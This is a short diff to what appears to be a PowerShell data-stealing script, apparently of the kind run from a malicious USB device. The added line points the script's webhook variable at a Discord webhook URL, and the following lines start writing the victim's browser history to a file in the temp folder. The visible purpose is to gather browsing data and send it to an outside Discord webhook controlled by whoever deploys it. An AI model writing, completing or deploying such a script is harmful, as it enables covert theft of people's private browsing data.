@@ -1,5 +1,5 @@
 ﻿
-$whuri = "$dc"
+$whuri = ("https://discord.com/api/webhooks/" + "$dc")
 
 $outpath = "$env:temp\browser_history.txt"
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII
